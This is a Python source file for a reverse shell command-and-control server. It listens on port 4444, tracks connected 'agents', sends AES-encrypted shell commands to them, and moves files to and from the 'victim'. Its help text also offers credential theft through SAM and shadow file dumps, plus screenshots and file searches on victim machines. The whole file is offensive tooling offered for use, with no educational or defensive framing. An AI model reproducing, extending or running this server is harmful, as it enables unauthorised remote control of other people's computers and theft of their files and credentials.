import socket
import threading
from aes_crypt import AESCipher
from base64 import b64encode, b64decode
import os


class ReverseShellServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"Listening on {self.host}:{self.port}...")

        while True:
            conn, addr = self.server_socket.accept()
            print(f"Connection from {addr}")
            client_id = addr[0] + ":" + str(addr[1])
            self.clients[client_id] = conn
            client_thread = threading.Thread(
                target=self.handle_client, args=(conn, addr)
            )
            client_thread.start()

    def handle_client(self, conn, addr):
        client_id = addr[0] + ":" + str(addr[1])
        try:
            while True:
                command = input("Shell> ")
                if command.lower() == "help":
                    self.show_help()
                elif command.lower() == "list":
                    self.list_clients()
                elif command.lower().startswith("select"):
                    selected_client = self.select_client(command)
                    if selected_client:
                        self.interactive_shell(selected_client)
                elif command.lower().startswith("download"):
                    self.handle_download(command, conn)
                elif command.lower().startswith("upload"):
                    self.handle_upload(command, conn)
                else:
                    print("Invalid command. Type 'help' for the list of commands.")
        except ConnectionResetError:
            print(f"Connection with {client_id} lost.")
        finally:
            conn.close()
            del self.clients[client_id]

    def show_help(self):
        print("\nAvailable Commands:")
        print("help         : Show this help message")
        print("list         : List all connected agents")
        print("select       : Select a specific agent to interact with")
        print("download     : Download files from the victim to the server")
        print("upload       : Upload files from the server to the victim")
        print("shell        : Open an interactive shell (bash or cmd)")
        print("ipconfig     : Get the network configuration of the victim machine")
        print("screenshot   : Take a screenshot of the victim machine")
        print("search       : Search for a file on the victim machine")
        print(
            "hashdump     : Retrieve the SAM database or shadow file from the victim machine\n"
        )

    def list_clients(self):
        print("\nActive agents:")
        for client_id in self.clients.keys():
            print(client_id)
        print()

    def select_client(self, command):
        try:
            client_id = command.split(" ", 1)[1]
        except IndexError:
            print("Error: 'select' command requires a client ID")
            return None
        if client_id in self.clients:
            return self.clients[client_id]
        else:
            print(f"Error: Client {client_id} not found")
            return None

    def handle_download(self, command, conn):
        try:
            file_path = command.split(" ", 1)[1]
        except IndexError:
            print("Error: 'download' command requires a file path")
            return
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        try:
            with open(file_path, "wb") as f:
                while True:
                    data = conn.recv(4096).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} downloaded successfully.")
        except Exception as e:
            print(f"Failed to download {file_path}: {e}")

    def handle_upload(self, command, conn):
        try:
            file_path = command.split(" ", 1)[1]
        except IndexError:
            print("Error: 'upload' command requires a file path")
            return
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        buffer_size = int(input("Enter buffer size for upload (in bytes): "))
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(buffer_size)
                    if not chunk:
                        break
                    conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            conn.send(AESCipher.encrypt("ERROR").encode("utf-8"))

    def interactive_shell(self, conn):
        while True:
            shell_command = input("Shell (type 'exit' to return)> ")
            if shell_command.lower() == "exit":
                break
            if shell_command:
                self.send_command(shell_command, conn)

    def send_command(self, command, conn):
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        data = conn.recv(4096).decode("utf-8")
        if data:
            print(AESCipher.decrypt(data))


if __name__ == "__main__":
    server = ReverseShellServer("0.0.0.0", 4444)
    server.start()
